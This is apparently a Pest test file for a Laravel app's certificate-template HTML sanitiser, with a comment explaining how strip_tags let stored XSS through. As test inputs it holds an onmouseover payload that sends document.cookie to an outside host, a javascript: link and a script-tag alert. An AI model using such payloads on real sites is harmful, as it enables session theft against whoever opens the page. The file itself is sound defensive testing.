<?php

use App\Domains\Courses\Actions\SaveCertificateTemplateAction;
use App\Domains\Identity\Models\User;
use Illuminate\Foundation\Testing\RefreshDatabase;

uses(RefreshDatabase::class);

/**
 * A certificate template body is author-written HTML that
 * `documents/course-certificate.blade.php` renders with `{!! $body_html !!}`
 * into an HTML document (ADR-012 — HTML is the production output, not PDF).
 *
 * It was sanitised with `strip_tags($body, '<p><br><strong>…')`, which removes
 * disallowed **tags** and keeps every **attribute** on the ones it allows. So
 * an event handler on a permitted tag went straight through.
 *
 * That matters here more than in most places because of who writes it:
 * `catalog.certificates.*` is open to `course_creator`, the lowest
 * content-authoring role, and a certificate is opened by admins, students and
 * families. Script in one runs with the reader's session, not the author's.
 */
function saveCertificateBody(string $body): ?string
{
    $admin = User::factory()->create();

    return app(SaveCertificateTemplateAction::class)->execute([
        'name' => 'Course completion',
        'kind' => 'course_completion',
        'active' => true,
        'rules' => ['min_progress_percent' => 0],
        'created_by' => $admin->id,
        'body_html' => $body,
    ])->body_html;
}

it('strips an event handler from a tag it otherwise allows', function () {
    // The precise shape strip_tags let through: `<p>` is on the allowlist, so
    // the tag stayed — and so did everything hanging off it.
    $stored = saveCertificateBody('<p onmouseover="fetch(\'https://elsewhere/?c=\'+document.cookie)">Well done</p>');

    expect($stored)->not->toContain('onmouseover')
        ->and($stored)->not->toContain('document.cookie')
        // The author's words survive. A sanitiser that threw the text away
        // would be safe and useless.
        ->and($stored)->toContain('Well done');
});

it('strips a javascript: link and keeps a real one', function () {
    $stored = saveCertificateBody('<p><a href="javascript:alert(1)">a</a> <a href="https://akuru.edu.mv">b</a></p>');

    expect($stored)->not->toContain('javascript:')
        ->and($stored)->toContain('https://akuru.edu.mv');
});

it('drops a script tag with its contents rather than unwrapping it', function () {
    // strip_tags removed the tags and left `alert(1)` sitting in the document
    // as loose text. Harmless in itself, and a sign the function was not doing
    // what the caller believed.
    $stored = saveCertificateBody('<p>Congratulations</p><script>alert(1)</script>');

    expect($stored)->not->toContain('alert(1)')
        ->and($stored)->toContain('Congratulations');
});

it('keeps the formatting a certificate actually uses', function () {
    $stored = saveCertificateBody('<h1>Certificate</h1><p>Awarded to <strong>Aishath</strong> on <em>1 Ramadan</em>.</p>');

    expect($stored)->toContain('<h1>')->toContain('<strong>')->toContain('<em>')
        ->and($stored)->toContain('Aishath');
});

it('unwraps a span rather than losing the words inside it', function () {
    // `<span>` was on the old allowlist and is not on the new one. It is only
    // ever useful with `style` or `class`, both of which the sanitiser strips
    // anyway — so nothing real is lost, but the text must survive.
    $stored = saveCertificateBody('<p>Awarded to <span class="name">Aishath</span></p>');

    expect($stored)->not->toContain('<span')
        ->and($stored)->toContain('Aishath');
});

it('stores nothing for a body that was only markup', function () {
    expect(saveCertificateBody('<script>alert(1)</script>'))->toBeNull();
});
